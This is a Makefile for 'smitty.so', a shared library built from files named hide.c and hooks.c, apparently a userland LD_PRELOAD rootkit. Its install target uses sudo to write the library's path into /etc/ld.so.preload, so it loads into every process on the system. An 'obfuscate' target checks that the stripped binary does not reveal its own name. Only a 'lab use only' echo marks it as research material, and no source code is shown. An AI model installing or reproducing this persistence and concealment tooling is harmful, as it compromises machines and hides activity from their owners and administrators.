CC = gcc
CFLAGS = -Wall -Wextra -fPIC -shared -O2 -D_GNU_SOURCE
LDFLAGS = -ldl -lpthread
TARGET = smitty.so
SOURCES = smitty.c hide.c hooks.c
OBJECTS = $(SOURCES:.c=.o)
STRIP = strip
OBFUSCATE = strings

.PHONY: all clean install uninstall test

all: $(TARGET)

$(TARGET): $(OBJECTS)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
	$(STRIP) --strip-unneeded $@

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

obfuscate: $(TARGET)
	@$(OBFUSCATE) $(TARGET) | grep -i smitty || echo "clean"

clean:
	rm -f $(OBJECTS) $(TARGET)

install: $(TARGET)
	@echo "lab use only"
	@sudo cp $(TARGET) /usr/local/lib/
	@echo '/usr/local/lib/$(TARGET)' | sudo tee /etc/ld.so.preload

uninstall:
	@sudo rm -f /usr/local/lib/$(TARGET)
	@sudo rm -f /etc/ld.so.preload

test:
	@make clean && make

debug: CFLAGS += -g -DDEBUG
debug: $(TARGET)

static-analysis:
	@cppcheck --enable=all --std=c99 $(SOURCES) 2>/dev/null || echo "no cppcheck"

help:
	@echo "all clean install uninstall test debug obfuscate static-analysis help"
